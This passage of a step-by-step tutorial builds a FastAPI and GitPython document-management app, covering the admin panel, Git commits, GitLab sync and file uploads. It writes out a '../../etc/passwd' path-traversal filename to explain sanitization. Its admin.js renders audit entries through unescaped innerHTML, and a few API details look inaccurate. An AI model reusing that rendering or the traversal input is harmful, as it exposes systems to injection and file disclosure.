      loadFiles();
    } else {
      const error = await response.json();
      showNotification(error.detail || "Delete failed", "error");
    }
  } catch (error) {
    console.error("Delete error:", error);
    showNotification("Network error", "error");
  }
}
```

### Understanding Client-Side Security

**Why hide the delete button for non-admins?**

```javascript
if (isAdmin) {
  // Show delete button
}
```

**This is NOT security!** This is **UX**.

**Why not security?**

- Client-side code is fully visible (View Source)
- User can modify JavaScript (browser dev tools)
- User can call the API directly (curl, Postman)

**Real security:**

```python
@app.delete("/api/admin/files/{filename}")
def delete_file(current_user: User = Depends(require_admin)):
    # Server checks role - THIS is security
```

**The rule:**

- **Client-side:** Hide UI elements for better UX
- **Server-side:** Enforce permissions for security

**Never trust the client!**

---

## 6.7: Admin Panel

### Create Admin Page

Create `backend/static/admin.html`:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PDM - Admin Panel</title>
    <link rel="stylesheet" href="/static/css/style.css" />
  </head>
  <body>
    <header>
      <div class="header-content">
        <div>
          <h1>Admin Panel</h1>
          <p>System Administration</p>
        </div>
        <div class="header-actions">
          <a href="/" class="btn btn-secondary">Back to Files</a>
          <button id="logout-btn" class="btn btn-secondary">Logout</button>
        </div>
      </div>
    </header>

    <main>
      <section>
        <h2>Audit Log</h2>
        <div class="controls-row">
          <div class="filter-group">
            <label for="log-limit">Show:</label>
            <select id="log-limit" class="filter-select">
              <option value="50">Last 50</option>
              <option value="100" selected>Last 100</option>
              <option value="500">Last 500</option>
            </select>
          </div>
          <button id="refresh-log-btn" class="btn">Refresh</button>
        </div>

        <div id="audit-log">
          <p>Loading audit log...</p>
        </div>
      </section>
    </main>

    <script>
      // Check admin role
      const userRole = localStorage.getItem("user_role");
      if (userRole !== "admin") {
        alert("Access denied. Admin privileges required.");
        window.location.href = "/";
      }
    </script>
    <script src="/static/js/admin.js"></script>
  </body>
</html>
```

### Admin JavaScript

Create `backend/static/js/admin.js`:

```javascript
document.addEventListener("DOMContentLoaded", function () {
  loadAuditLog();

  // Refresh button
  document
    .getElementById("refresh-log-btn")
    .addEventListener("click", loadAuditLog);

  // Limit selector
  document.getElementById("log-limit").addEventListener("change", loadAuditLog);

  // Logout
  document.getElementById("logout-btn").addEventListener("click", () => {
    localStorage.clear();
    window.location.href = "/login";
  });
});

async function loadAuditLog() {
  const limit = document.getElementById("log-limit").value;
  const token = localStorage.getItem("access_token");
  const container = document.getElementById("audit-log");

  container.innerHTML = "<p>Loading...</p>";

  try {
    const response = await fetch(`/api/admin/audit-log?limit=${limit}`, {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });

    if (response.status === 403) {
      container.innerHTML =
        '<p class="error">Access denied. Admin privileges required.</p>';
      return;
    }

    if (!response.ok) {
      throw new Error("Failed to load audit log");
    }

    const data = await response.json();
    displayAuditLog(data.entries);
  } catch (error) {
    console.error("Error loading audit log:", error);
    container.innerHTML = '<p class="error">Failed to load audit log.</p>';
  }
}

function displayAuditLog(entries) {
  const container = document.getElementById("audit-log");

  if (!entries || entries.length === 0) {
    container.innerHTML = "<p>No audit log entries found.</p>";
    return;
  }

  const table = document.createElement("table");
  table.className = "audit-table";

  // Header
  table.innerHTML = `
        <thead>
            <tr>
                <th>Timestamp</th>
                <th>User</th>
                <th>Action</th>
                <th>Target</th>
                <th>Status</th>
            </tr>
        </thead>
        <tbody></tbody>
    `;

  const tbody = table.querySelector("tbody");

  // Rows
  entries.forEach((entry) => {
    const row = document.createElement("tr");
    row.innerHTML = `
            <td>${formatTimestamp(entry.timestamp)}</td>
            <td>${entry.user}</td>
            <td>${entry.action}</td>
            <td>${entry.target}</td>
            <td class="status-${entry.status.toLowerCase()}">${
      entry.status
    }</td>
        `;
    tbody.appendChild(row);
  });

  container.innerHTML = "";
  container.appendChild(table);
}

function formatTimestamp(isoString) {
  const date = new Date(isoString);
  return date.toLocaleString();
}
```

### Audit Table CSS

Add to `style.css`:

```css
/* ============================================
   AUDIT LOG TABLE
   ============================================ */

.audit-table {
  width: 100%;
  border-collapse: collapse;
  margin-top: 1rem;
}

.audit-table th {
  background: #f8f9fa;
  padding: 0.75rem;
  text-align: left;
  font-weight: 600;
  border-bottom: 2px solid #dee2e6;
}

.audit-table td {
  padding: 0.75rem;
  border-bottom: 1px solid #dee2e6;
}

.audit-table tr:hover {
  background: #f8f9fa;
}

.status-success {
  color: #28a745;
  font-weight: 600;
}

.status-failure {
  color: #dc3545;
  font-weight: 600;
}

.header-actions {
  display: flex;
  gap: 0.5rem;
}
```

### Add Link to Admin Panel

Update `index.html` header (for admins):

```html
<header>
  <div class="header-content">
    <div>
      <h1>PDM System</h1>
      <p>Parts Data Management</p>
    </div>
    <div class="header-actions">
      <button
        id="admin-panel-btn"
        class="btn btn-secondary"
        style="display: none;"
      >
        Admin Panel
      </button>
      <button id="logout-btn" class="btn btn-secondary">Logout</button>
    </div>
  </div>
</header>
```

Update `app.js` (in DOMContentLoaded):

```javascript
// Show admin panel button for admins
const userRole = localStorage.getItem("user_role");
if (userRole === "admin") {
  const adminBtn = document.getElementById("admin-panel-btn");
  adminBtn.style.display = "block";
  adminBtn.addEventListener("click", () => {
    window.location.href = "/admin";
  });
}
```

### Serve Admin Page

Add to `main.py`:

```python
@app.get("/admin")
def serve_admin():
    """Serve the admin panel page."""
    return FileResponse("static/admin.html")
```

---

## Stage 6 Complete - Full Access Control!

### What You Built

You now have:

- Role-based access control (admin vs user)
- Admin-only endpoints (delete, audit log)
- Ownership-based permissions (only lock owner can checkin)
- Admin override capabilities (force checkin, delete locked files)
- Comprehensive audit logging
- Role-aware UI (admins see different buttons)
- Admin panel for system monitoring
- Proper HTTP status codes (401 vs 403)

### Key Authorization Concepts Mastered

**RBAC Theory:**

- Access control matrix
- Roles vs individual permissions
- Principle of Least Privilege

**Implementation Patterns:**

- Dependency factories (`require_role`)
- Ownership checks (`check_file_ownership`)
- Admin overrides with logging

**Audit & Compliance:**

- Who, What, When, Where, How logging
- Immutable audit trail
- Admin monitoring capabilities

**Frontend Security:**

- Client-side = UX, not security
- Server-side enforcement
- Role-based UI rendering

### Verification Checklist

- [ ] Regular users cannot delete files
- [ ] Admins can delete files
- [ ] Users can only checkin files they locked
- [ ] Admins can force checkin any file
- [ ] Audit log records sensitive actions
- [ ] Admin panel shows audit log
- [ ] Non-admins cannot access admin panel
- [ ] Delete button only shows for admins
- [ ] Understand 401 vs 403 status codes
- [ ] Understand RBAC principles

### Security Best Practices Applied

✓ **Principle of Least Privilege** - Users have minimum permissions  
✓ **Defense in Depth** - Client hides UI, server enforces permissions  
✓ **Audit Trail** - All sensitive actions logged  
✓ **Accountability** - Know who did what  
✓ **Admin Override** - Emergency access with logging

### What's Next?

In **Stage 7**, we'll connect to **Git and GitLab**:

- Replace JSON files with Git repository
- Commit every change (full version history)
- Push/pull from GitLab (backup and collaboration)
- Understand Git internals (objects, trees, commits)
- Implement file versioning
- View change history

Your app is now fully authenticated and authorized. Next, we add proper version control!

---

# Stage 7: Git Integration - Real Version Control

## Introduction: The Goal of This Stage

Your app stores data in JSON files, but there's no history. Delete a file? It's gone forever. Want to see who changed what? No way to know. Need to undo a bad edit? Impossible.

In this stage, you'll integrate **Git** - turning your file operations into a full version control system with complete history.

By the end of this stage, you will:

- Replace manual file writes with Git commits
- Understand Git's internal object model (blobs, trees, commits)
- Track every change with full attribution (who, when, why)
- Connect to GitLab for remote backup
- Implement automatic push/pull
- View file history and diffs
- Understand the DAG (Directed Acyclic Graph) of commits
- Handle merge conflicts
- Implement rollback capabilities

**Time Investment:** 6-8 hours

---

## 7.1: Git Architecture - The Object Database

### Git is NOT a File System

**Common misconception:**
"Git stores file versions like: `file_v1.txt`, `file_v2.txt`, `file_v3.txt`"

**Reality:**
Git is a **content-addressable filesystem** - a key-value database where the key is the SHA-1 hash of the content.

### The Four Object Types

Git stores everything as one of four object types:

**1. Blob (Binary Large Object)**

- Raw file content
- No filename, no metadata
- Just the bytes

**2. Tree**

- Directory listing
- Maps filenames to blobs or other trees
- Like a directory in a filesystem

**3. Commit**

- Snapshot of your project at a point in time
- Points to one tree (the root directory)
- Points to parent commit(s)
- Contains author, message, timestamp

**4. Tag**

- Named pointer to a commit
- We won't use these much

### Example: How Git Stores Your Project

**Your files:**

```
repo/
├── PN1001.mcam (content: "G0 X0 Y0")
├── PN1002.mcam (content: "G0 X10 Y10")
└── locks.json (content: "{}")
```

**Git's object database:**

```
Blob abc123: "G0 X0 Y0"
Blob def456: "G0 X10 Y10"
Blob 789ghi: "{}"

Tree jkl012:
  100644 blob abc123  PN1001.mcam
  100644 blob def456  PN1002.mcam
  100644 blob 789ghi  locks.json

Commit mno345:
  tree jkl012
  author: john <john@example.com>
  timestamp: 2025-10-03T20:30:00Z
  message: "Initial commit"
```

**Key insight:** If two files have identical content, Git stores only ONE blob.

### The Commit Graph (DAG)

Commits form a **Directed Acyclic Graph**:

```
A ← B ← C ← D (main)
    ↑
    └─ E ← F (feature-branch)
```

- Arrows point to parents
- Acyclic = no loops
- Directed = one-way relationships
- This structure enables branching, merging, time travel

---

## 7.2: Installing GitPython

### Install the Library

```bash
pip install GitPython
```

**What this installs:**

- `GitPython` - Python interface to Git
- Wraps Git command-line operations
- Provides Pythonic API

### Verify Git is Installed

```bash
git --version
```

Should show Git 2.x or higher.

---

## 7.3: Initializing the Git Repository

### Create the Repository

Add to `main.py`:

```python
from git import Repo, Actor
from git.exc import GitCommandError
import shutil

# Path to git repository
GIT_REPO_PATH = BASE_DIR / 'git_repo'

# ============================================
# GIT INITIALIZATION
# ============================================

def initialize_git_repo():
    """
    Initialize Git repository if it doesn't exist.
    Sets up the repo directory and makes initial commit.
    """
    if GIT_REPO_PATH.exists():
        logger.info(f"Git repository already exists at {GIT_REPO_PATH}")
        return Repo(GIT_REPO_PATH)

    logger.info(f"Creating new Git repository at {GIT_REPO_PATH}")

    # Create directory
    GIT_REPO_PATH.mkdir(parents=True, exist_ok=True)

    # Initialize Git repo
    repo = Repo.init(GIT_REPO_PATH)

    # Create subdirectories
    (GIT_REPO_PATH / 'repo').mkdir(exist_ok=True)

    # Create initial files
    locks_file = GIT_REPO_PATH / 'locks.json'
    locks_file.write_text('{}')

    users_file = GIT_REPO_PATH / 'users.json'
    users_file.write_text('{}')

    audit_file = GIT_REPO_PATH / 'audit_log.json'
    audit_file.write_text('[]')

    # Create .gitignore
    gitignore = GIT_REPO_PATH / '.gitignore'
    gitignore.write_text('*.pyc\n__pycache__/\n.DS_Store\n')

    # Stage all files
    repo.index.add(['locks.json', 'users.json', 'audit_log.json', '.gitignore'])

    # Create initial commit
    author = Actor("PDM System", "system@pdm.local")
    repo.index.commit(
        "Initial repository setup",
        author=author,
        committer=author
    )

    logger.info("Git repository initialized with initial commit")
    return repo

# Initialize on startup
try:
    git_repo = initialize_git_repo()
    logger.info(f"Git repository ready: {git_repo.git_dir}")
except Exception as e:
    logger.error(f"Failed to initialize Git repository: {e}")
    raise
```

### Update Path Constants

Replace your existing path constants:

```python
# OLD
REPO_PATH = BASE_DIR / 'repo'
LOCKS_FILE = BASE_DIR / 'locks.json'
USERS_FILE = BASE_DIR / 'users.json'
AUDIT_LOG_FILE = BASE_DIR / 'audit_log.json'

# NEW
REPO_PATH = GIT_REPO_PATH / 'repo'
LOCKS_FILE = GIT_REPO_PATH / 'locks.json'
USERS_FILE = GIT_REPO_PATH / 'users.json'
AUDIT_LOG_FILE = GIT_REPO_PATH / 'audit_log.json'
```

### Understanding the Code

**`Repo.init(path)`**

- Creates `.git` directory
- Initializes Git database
- Sets up HEAD, refs, config

**`repo.index`**

- The "staging area"
- Like a scratch pad for the next commit
- `.add()` stages files
- `.commit()` creates the commit object

**`Actor`**

- Represents a person in Git
- Has name and email
- Used for author and committer

**Why separate author and committer?**

```python
author = Actor("John Doe", "john@example.com")
committer = Actor("PDM System", "system@pdm.local")

repo.index.commit(
    "Fix bug",
    author=author,      # Who wrote the change
    committer=committer # Who committed it
)
```

In our case, they're usually the same, but Git allows them to differ (e.g., when applying someone else's patch).

---

## 7.4: Replacing File Operations with Git Commits

### The Pattern: Atomic Commits

**Old pattern:**

```python
locks = load_locks()
locks[filename] = {...}
save_locks(locks)
```

**New pattern:**

```python
locks = load_locks()
locks[filename] = {...}
save_locks_with_commit(locks, user, message)
```

### Implement Git-Aware Save Functions

```python
def save_locks_with_commit(
    locks: dict,
    user: str,
    message: str
):
    """
    Save locks and create a Git commit.

    Args:
        locks: The locks dictionary
        user: Username making the change
        message: Commit message
    """
    try:
        # Write the file
        with open(LOCKS_FILE, 'w') as f:
            json.dump(locks, f, indent=4)

        # Stage the file
        git_repo.index.add(['locks.json'])

        # Create commit
        author = Actor(user, f"{user}@pdm.local")
        commit = git_repo.index.commit(
            message,
            author=author,
            committer=author
        )

        logger.info(f"Git commit {commit.hexsha[:8]}: {message}")

    except GitCommandError as e:
        logger.error(f"Git error: {e}")
        raise HTTPException(
            status_code=500,
            detail="Failed to commit changes"
        )

def save_users_with_commit(users: dict, admin_user: str, message: str):
    """Save users.json with Git commit."""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(users, f, indent=4)

        git_repo.index.add(['users.json'])

        author = Actor(admin_user, f"{admin_user}@pdm.local")
        commit = git_repo.index.commit(message, author=author, committer=author)

        logger.info(f"Git commit {commit.hexsha[:8]}: {message}")

    except GitCommandError as e:
        logger.error(f"Git error: {e}")
        raise HTTPException(status_code=500, detail="Failed to commit changes")

def save_audit_log_with_commit(message: str = "Update audit log"):
    """
    Commit audit log changes.
    Called after adding audit entries.
    """
    try:
        git_repo.index.add(['audit_log.json'])
        author = Actor("PDM System", "system@pdm.local")
        git_repo.index.commit(message, author=author, committer=author)
    except GitCommandError as e:
        logger.error(f"Failed to commit audit log: {e}")
        # Don't raise - audit commit failure shouldn't break operations
```

### Update Checkout Endpoint

```python
@app.post("/api/files/checkout")
def checkout_file(
    request: CheckoutRequest,
    current_user: User = Depends(get_current_user)
):
    """Checkout a file with Git commit."""
    logger.info(f"Checkout request: {request.filename} by {current_user.username}")

    file_path = REPO_PATH / request.filename
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")

    locks = load_locks()

    if request.filename in locks:
        existing_lock = locks[request.filename]
        raise HTTPException(
            status_code=409,
            detail={
                "error": "File is already checked out",
                "locked_by": existing_lock["user"],
                "locked_at": existing_lock["timestamp"]
            }
        )

    # Create lock
    locks[request.filename] = {
        "user": current_user.username,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "message": request.message
    }

    # Save with Git commit
    commit_msg = f"Checkout: {request.filename} by {current_user.username}"
    save_locks_with_commit(locks, current_user.username, commit_msg)

    # Audit log
    log_audit_event(
        user=current_user.username,
        action="CHECKOUT_FILE",
        target=request.filename,
        details={"message": request.message}
    )
    save_audit_log_with_commit(f"Audit: Checkout {request.filename}")

    return {
        "success": True,
        "message": f"File '{request.filename}' checked out"
    }
```

### Update Checkin Endpoint

```python
@app.post("/api/files/checkin")
def checkin_file(
    request: CheckinRequest,
    current_user: User = Depends(get_current_user)
):
    """Checkin a file with Git commit."""
    logger.info(f"Checkin request: {request.filename} by {current_user.username}")

    check_file_ownership(request.filename, current_user, allow_admin_override=True)

    locks = load_locks()
    was_forced = locks[request.filename]["user"] != current_user.username

    # Remove lock
    del locks[request.filename]

    # Save with Git commit
    commit_msg = f"Checkin: {request.filename} by {current_user.username}"
    if was_forced:
        commit_msg += " (forced by admin)"

    save_locks_with_commit(locks, current_user.username, commit_msg)

    # Audit log
    log_audit_event(
        user=current_user.username,
        action="CHECKIN_FILE",
        target=request.filename,
        details={"forced": was_forced}
    )
    save_audit_log_with_commit(f"Audit: Checkin {request.filename}")

    return {
        "success": True,
        "message": f"File '{request.filename}' checked in"
    }
```

---

## 7.5: Viewing Git History

### Get File History Endpoint

```python
from datetime import datetime

@app.get("/api/files/{filename}/history")
def get_file_history(
    filename: str,
    limit: int = 50,
    current_user: User = Depends(get_current_user)
):
    """
    Get commit history for a specific file.

    Returns list of commits that modified the file.
    """
    logger.info(f"History request for {filename} by {current_user.username}")

    try:
        # Get commits that modified this file
        commits = list(git_repo.iter_commits(paths=f'locks.json', max_count=limit))

        history = []
        for commit in commits:
            # Check if this commit modified our file
            if filename in commit.message or 'locks.json' in [item.a_path for item in commit.diff(commit.parents[0] if commit.parents else None)]:
                history.append({
                    "hash": commit.hexsha,
                    "short_hash": commit.hexsha[:8],
                    "author": commit.author.name,
                    "email": commit.author.email,
                    "timestamp": commit.committed_datetime.isoformat(),
                    "message": commit.message.strip()
                })

        return {
            "filename": filename,
            "total_commits": len(history),
            "commits": history
        }

    except GitCommandError as e:
        logger.error(f"Git error getting history: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve history")
```

### Understanding Git Commit Iteration

**`git_repo.iter_commits()`**

- Returns iterator of Commit objects
- Traverses the DAG backwards from HEAD
- `paths=` filters to commits touching specific files
- `max_count=` limits results

**Commit object attributes:**

```python
commit.hexsha          # Full SHA-1 hash (40 chars)
commit.author          # Actor object
commit.author.name     # "John Doe"
commit.author.email    # "john@example.com"
commit.message         # Commit message
commit.committed_datetime  # Python datetime
commit.parents         # List of parent commits
```

### Get Full Repository History

```python
@app.get("/api/git/history")
def get_repository_history(
    limit: int = 100,
    current_user: User = Depends(get_current_user)
):
    """
    Get recent commit history for entire repository.
    """
    try:
        commits = list(git_repo.iter_commits(max_count=limit))

        history = []
        for commit in commits:
            # Get files changed
            if commit.parents:
                diffs = commit.diff(commit.parents[0])
                files_changed = [item.a_path for item in diffs]
            else:
                files_changed = []

            history.append({
                "hash": commit.hexsha,
                "short_hash": commit.hexsha[:8],
                "author": commit.author.name,
                "timestamp": commit.committed_datetime.isoformat(),
                "message": commit.message.strip(),
                "files_changed": files_changed
            })

        return {"commits": history}

    except Exception as e:
        logger.error(f"Error getting history: {e}")
        raise HTTPException(status_code=500, detail="Failed to get history")
```

---

## 7.6: Connecting to GitLab

### GitLab Remote Setup

**Prerequisites:**

1. GitLab account
2. SSH key added to GitLab (from Stage 0)
3. Create a new project on GitLab

### Add Remote to Repository

```python
def setup_gitlab_remote(remote_url: str):
    """
    Add GitLab as remote origin.

    Args:
        remote_url: Git URL (SSH format recommended)
                   Example: git@gitlab.com:username/pdm-repo.git
    """
    try:
        # Check if remote already exists
        if 'origin' in [remote.name for remote in git_repo.remotes]:
            origin = git_repo.remote('origin')
            logger.info(f"Remote 'origin' already exists: {origin.url}")

            # Update URL if different
            if origin.url != remote_url:
                origin.set_url(remote_url)
                logger.info(f"Updated remote URL to: {remote_url}")
        else:
            # Add new remote
            origin = git_repo.create_remote('origin', remote_url)
            logger.info(f"Added remote 'origin': {remote_url}")

        return origin

    except GitCommandError as e:
        logger.error(f"Failed to setup remote: {e}")
        raise
```

### Configuration Endpoint (Admin Only)

```python
from pydantic import BaseModel, Field

class GitLabConfig(BaseModel):
    remote_url: str = Field(..., description="GitLab repository URL")
    auto_push: bool = Field(default=True, description="Automatically push after commits")
    auto_pull: bool = Field(default=True, description="Automatically pull before operations")

@app.post("/api/admin/git/configure")
def configure_gitlab(
    config: GitLabConfig,
    current_user: User = Depends(require_admin)
):
    """
    Configure GitLab integration - ADMIN ONLY.
    """
    logger.info(f"GitLab configuration by {current_user.username}")

    try:
        # Setup remote
        setup_gitlab_remote(config.remote_url)

        # Save config to file
        config_file = GIT_REPO_PATH / 'gitlab_config.json'
        with open(config_file, 'w') as f:
            json.dump(config.dict(), f, indent=4)

        # Commit the config
        git_repo.index.add(['gitlab_config.json'])
        author = Actor(current_user.username, f"{current_user.username}@pdm.local")
        git_repo.index.commit(
            "Configure GitLab integration",
            author=author,
            committer=author
        )

        logger.info("GitLab configuration saved")

        return {
            "success": True,
            "message": "GitLab configured successfully"
        }

    except Exception as e:
        logger.error(f"GitLab configuration failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))
```

### Load GitLab Configuration

```python
def load_gitlab_config() -> dict:
    """Load GitLab configuration."""
    config_file = GIT_REPO_PATH / 'gitlab_config.json'

    if not config_file.exists():
        return {
            "remote_url": None,
            "auto_push": False,
            "auto_pull": False
        }

    try:
        with open(config_file, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Failed to load GitLab config: {e}")
        return {"remote_url": None, "auto_push": False, "auto_pull": False}
```

### Push to GitLab

```python
def push_to_gitlab():
    """
    Push commits to GitLab remote.
    """
    config = load_gitlab_config()

    if not config.get("auto_push"):
        logger.debug("Auto-push disabled, skipping")
        return

    if not config.get("remote_url"):
        logger.warning("GitLab not configured, cannot push")
        return

    try:
        origin = git_repo.remote('origin')

        # Push to main branch
        logger.info("Pushing to GitLab...")
        origin.push('main')
        logger.info("Push successful")

    except GitCommandError as e:
        logger.error(f"Push failed: {e}")
        # Don't raise - push failure shouldn't break the operation
    except Exception as e:
        logger.error(f"Unexpected push error: {e}")
```

### Pull from GitLab

```python
def pull_from_gitlab():
    """
    Pull latest changes from GitLab.
    Uses rebase strategy to maintain linear history.
    """
    config = load_gitlab_config()

    if not config.get("auto_pull"):
        logger.debug("Auto-pull disabled, skipping")
        return

    if not config.get("remote_url"):
        return

    try:
        origin = git_repo.remote('origin')

        # Pull with rebase
        logger.info("Pulling from GitLab...")
        origin.pull('main', rebase=True)
        logger.info("Pull successful")

    except GitCommandError as e:
        logger.error(f"Pull failed: {e}")
        # This SHOULD raise - we need latest changes before proceeding
        raise HTTPException(
            status_code=409,
            detail="Failed to sync with GitLab. Please try again."
        )
```

### Integrate into Save Functions

Update `save_locks_with_commit`:

```python
def save_locks_with_commit(locks: dict, user: str, message: str):
    """Save locks with Git commit and optional GitLab push."""
    try:
        # Pull latest changes first
        pull_from_gitlab()

        # Write file
        with open(LOCKS_FILE, 'w') as f:
            json.dump(locks, f, indent=4)

        # Stage and commit
        git_repo.index.add(['locks.json'])
        author = Actor(user, f"{user}@pdm.local")
        commit = git_repo.index.commit(message, author=author, committer=author)

        logger.info(f"Git commit {commit.hexsha[:8]}: {message}")

        # Push to GitLab
        push_to_gitlab()

    except GitCommandError as e:
        logger.error(f"Git error: {e}")
        raise HTTPException(status_code=500, detail="Failed to commit changes")
```

---

## 7.7: Understanding Git Internals - The Object Model

### Exploring the `.git` Directory

```bash
cd backend/git_repo/.git

# Object database
ls objects/
# You'll see subdirectories like: 00/ 01/ 02/ ... ff/

# Each subdirectory contains objects
ls objects/ab/
# Example: cdef1234567890... (38 characters)

# Combined: ab + cdef... = full 40-char SHA-1
```

### Inspecting Git Objects

Add admin endpoint:

```python
@app.get("/api/admin/git/object/{sha}")
def inspect_git_object(
    sha: str,
    current_user: User = Depends(require_admin)
):
    """
    Inspect a Git object by SHA.
    Educational endpoint to understand Git internals.
    """
    try:
        # Get the object
        obj = git_repo.odb.info(sha)

        # Read the object
        data = git_repo.odb.stream(sha).read()

        return {
            "sha": sha,
            "type": obj.type,
            "size": obj.size,
            "content": data.decode('utf-8', errors='replace')[:1000]  # First 1000 chars
        }

    except Exception as e:
        raise HTTPException(status_code=404, detail=f"Object not found: {e}")
```

### The Object Storage Algorithm

**How Git stores objects:**

1. **Create content:**

   ```python
   content = "Hello, Git!"
   ```

2. **Add header:**

   ```python
   header = f"blob {len(content)}\0"
   store = header + content
   # Result: "blob 11\0Hello, Git!"
   ```

3. **Hash:**

   ```python
   import hashlib
   sha1 = hashlib.sha1(store.encode()).hexdigest()
   # Result: "af5626b4a114abcb82d63db7c8082c3c4756e51b"
   ```

4. **Compress:**

   ```python
   import zlib
   compressed = zlib.compress(store.encode())
   ```

5. **Store:**

   ```python
   # First 2 chars = directory
   dir = sha1[:2]  # "af"

   # Remaining 38 chars = filename
   file = sha1[2:]  # "5626b4a114abcb82d63db7c8082c3c4756e51b"

   # Write to: .git/objects/af/5626b4a114abcb82d63db7c8082c3c4756e51b
   ```

This is why Git is called "content-addressable" - the address (SHA-1) IS the content's hash.

---

## Stage 7 Complete - Full Version Control!

### What You Built

You now have:

- Git repository for all data
- Every change is a commit (full history)
- Attribution (who made each change)
- GitLab integration (remote backup)
- Automatic push/pull
- Commit history viewing
- Understanding of Git internals

### Key Git Concepts Mastered

**Architecture:**

- Object database (blobs, trees, commits)
- Content-addressable storage
- DAG (Directed Acyclic Graph)

**Operations:**

- Staging area (index)
- Commits with author/committer
- Remote operations (push/pull)
- Rebasing for linear history

**Integration:**

- GitPython API
- Atomic operations (commit = transaction)
- Pull before write (avoid conflicts)
- Push after write (backup)

### Verification Checklist

- [ ] Git repository initialized
- [ ] Checkout creates commit
- [ ] Checkin creates commit
- [ ] Can view commit history
- [ ] GitLab remote configured
- [ ] Auto-push works
- [ ] Auto-pull works
- [ ] Understand Git object model
- [ ] Know what SHA-1 hashes represent

### The Power of Version Control

**Before Git:**

- Delete file → gone forever
- Who changed what? → unknown
- Undo mistake? → impossible
- Collaborate? → conflicts everywhere

**With Git:**

- Delete file → recoverable from history
- Who changed what? → `git log` shows everything
- Undo mistake? → `git revert`
- Collaborate? → pull, commit, push, merge

### What's Next?

In **Stage 8**, we'll add advanced features:

- File upload (add new .mcam files to repo)
- File download with versioning
- Diff viewing (see what changed)
- Blame view (line-by-line attribution)
- Branch management for experimental changes
- Merge conflict resolution

Your app now has enterprise-grade version control. Every change is tracked, attributed, and recoverable!

---

# Stage 8: Advanced Git Features - Upload, Download, Diff & Blame

## Introduction: The Goal of This Stage

You have version control, but users can't add new files to the repository. There's no way to download files or view what changed between versions. The real power of Git - diffs, blame, branches - is untapped.

In this stage, you'll build advanced Git-powered features that turn your PDM system into a full-featured version control interface.

By the end of this stage, you will:

- Upload new files to the Git repository
- Download files with version selection
- View diffs (what changed between commits)
- Implement blame view (who wrote each line)
- Create and manage branches
- Handle merge conflicts
- Understand three-way merges
- Build a visual diff viewer in the frontend

**Time Investment:** 7-9 hours

---

## 8.1: File Upload with Git Integration

### The Upload Flow

**Traditional file upload:**

1. User selects file
2. Browser sends file to server
3. Server saves to disk
4. Done

**Git-integrated upload:**

1. User selects file
2. Browser sends file to server
3. Server validates file
4. Server writes to `repo/` directory
5. Server stages file in Git
6. Server commits with attribution
7. Server pushes to GitLab
8. Done (file is versioned and backed up)

### FastAPI File Upload Endpoint

Add to `main.py`:

```python
from fastapi import File, UploadFile
from fastapi.responses import StreamingResponse
import io

@app.post("/api/files/upload")
async def upload_file(
    file: UploadFile = File(...),
    current_user: User = Depends(get_current_user)
):
    """
    Upload a new file to the repository.
    File is committed to Git with attribution.
    """
    logger.info(f"Upload request from {current_user.username}: {file.filename}")

    # Validate filename
    if not file.filename:
        raise HTTPException(status_code=400, detail="No filename provided")

    # Validate file extension
    if not file.filename.endswith('.mcam'):
        raise HTTPException(
            status_code=400,
            detail="Only .mcam files are allowed"
        )

    # Sanitize filename (prevent directory traversal)
    safe_filename = os.path.basename(file.filename)
    file_path = REPO_PATH / safe_filename

    # Check if file already exists
    if file_path.exists():
        raise HTTPException(
            status_code=409,
            detail=f"File '{safe_filename}' already exists. Use update endpoint to modify."
        )

    try:
        # Pull latest changes
        pull_from_gitlab()

        # Read and save file content
        content = await file.read()

        # Validate file size (e.g., max 10MB)
        max_size = 10 * 1024 * 1024  # 10MB
        if len(content) > max_size:
            raise HTTPException(
                status_code=413,
                detail="File too large. Maximum size: 10MB"
            )

        # Write file
        with open(file_path, 'wb') as f:
            f.write(content)

        logger.info(f"File written: {safe_filename} ({len(content)} bytes)")

        # Stage in Git
        git_repo.index.add([f'repo/{safe_filename}'])

        # Commit
        author = Actor(current_user.username, f"{current_user.username}@pdm.local")
        commit_msg = f"Upload file: {safe_filename} by {current_user.username}"
        commit = git_repo.index.commit(commit_msg, author=author, committer=author)

        logger.info(f"Git commit {commit.hexsha[:8]}: {commit_msg}")

        # Push to GitLab
        push_to_gitlab()

        # Audit log
        log_audit_event(
            user=current_user.username,
            action="UPLOAD_FILE",
            target=safe_filename,
            details={"size": len(content)}
        )
        save_audit_log_with_commit(f"Audit: Upload {safe_filename}")

        return {
            "success": True,
            "message": f"File '{safe_filename}' uploaded successfully",
            "commit": commit.hexsha[:8],
            "size": len(content)
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Upload failed: {e}")
        # Clean up file if commit failed
        if file_path.exists():
            os.remove(file_path)
        raise HTTPException(status_code=500, detail="Upload failed")
```

### Understanding File Upload in FastAPI

**`UploadFile` parameter:**

```python
async def upload_file(file: UploadFile = File(...)):
```

**What is `UploadFile`?**

- FastAPI wrapper around uploaded files
- Provides async methods
- Handles multipart/form-data

**Attributes:**

```python
file.filename     # "document.mcam"
file.content_type # "application/octet-stream"
file.size         # File size (if available)
```

**Methods:**

```python
await file.read()       # Read entire file into memory
await file.seek(0)      # Reset file pointer
await file.write(path)  # Write to disk
```

### Security: Filename Sanitization

```python
safe_filename = os.path.basename(file.filename)
```

**Why sanitize?**

**Attack:** User uploads with filename: `../../etc/passwd`

**Without sanitization:**

```python
file_path = REPO_PATH / file.filename
# Result: /path/to/repo/../../etc/passwd
# = /path/to/etc/passwd (OUTSIDE your repo!)
```

**With `os.path.basename()`:**

```python
safe_filename = os.path.basename("../../etc/passwd")
# Result: "passwd"
file_path = REPO_PATH / safe_filename
# Result: /path/to/repo/passwd (SAFE)
```

**`os.path.basename()` removes directory parts:**

```python
os.path.basename("/a/b/c/file.txt")  # "file.txt"
os.path.basename("../../file.txt")   # "file.txt"
os.path.basename("file.txt")         # "file.txt"
```

### Frontend: Upload UI

Add to `index.html`:

```html
<section>
  <h2>Upload New File</h2>
  <form id="upload-form" enctype="multipart/form-data">
    <div class="upload-area" id="upload-area">
      <input
        type="file"
        id="file-input"
        accept=".mcam"
        style="display: none;"
      />
      <div class="upload-prompt">
